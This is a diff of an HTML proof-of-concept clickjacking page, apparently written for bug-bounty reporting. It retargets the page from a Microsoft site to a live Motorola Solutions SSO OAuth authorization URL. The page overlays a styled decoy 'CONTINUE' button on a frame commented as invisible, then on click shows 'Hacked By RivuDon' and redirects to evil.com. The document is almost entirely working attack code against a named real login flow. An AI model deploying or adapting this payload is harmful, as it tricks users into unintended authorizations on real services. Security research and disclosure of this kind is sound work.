@@ -1,9 +1,6 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MSRC POC</title>
+<title>Motorola POC</title>
 
 <style>
     iframe {
@@ -16,51 +13,48 @@
         z-index: 99;
     }
 
-    /* Replaced button style */
-    button {
-        z-index: 200;
+    /* Login button (exact style) */
+    .login-btn {
         position: relative;
-        top: 433px;
-        left: 30px;
+        top: 502px;
+        left: 580px;
+        z-index: 200;
 
-        background-color: #B4A3EC; /* light blue */
-        color: #000000;
+        width: 120px;
+        height: 50px;
+
+        background: #0f0f0f;
+        color: #ffffff;
 
         border: none;
-        border-radius: 6px;
+        border-radius: 999px;
 
-        padding: 12px 22px;
-        font-size: 20px;
-        font-weight: 600;
-        font-family: "Segoe UI", Arial, sans-serif;
+        font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        font-size: 16px;
+        font-weight: 500;
 
+        text-align: center;
         cursor: pointer;
-        box-shadow: 0 2px 0 rgba(0,0,0,0.15);
-    }
 
-    button:active {
-        transform: translateY(1px);
-        box-shadow: 0 1px 0 rgba(0,0,0,0.15);
+        box-shadow: inset 0 1px 0 rgba(255,255,255,0.3);
     }
-
-    h1 {
-        top: 300px;
-        position: relative;
-    }
+	
 </style>
 </head>
 
 <body>
 
-<button onclick="handleClick()">Download</button>
+<button class="login-btn" onclick="handleClick()">
+    CONTINUE
+</button>
 
 <!-- Invisible iframe -->
-<iframe id="target-frame" src="https://dotnet.microsoft.com/en-us/" frameborder="0"></iframe>
+<iframe id="target-frame" src="https://sso.motorolasolutions.com/oauth2/default/v1/authorize?client_id=0oa138uhjwm4mwUN12p8&redirect_uri=https%3A%2F%2Fsso.prd.zoominsoftware.app%2Foidc%2Fauthorization-code%2Fcallback%2Fmotorola-msi-prod&scope=openid+profile+email&state=nBIflhyhQc&nonce=Z3lvqYZCOz&response_type=code&response_mode=query" frameborder="0"></iframe>
 
 <script>
 function handleClick() {
   alert("Hacked By RivuDon");
-  window.location.href = "https://github.com/Rivek619/R-Payloads-101/blob/main/Image-Payloads/Hacked_Rivudon.jpg?raw=true";
+  window.location.href = "https://evil.com";
 }
 
 document.getElementById('target-frame').onload = function() {
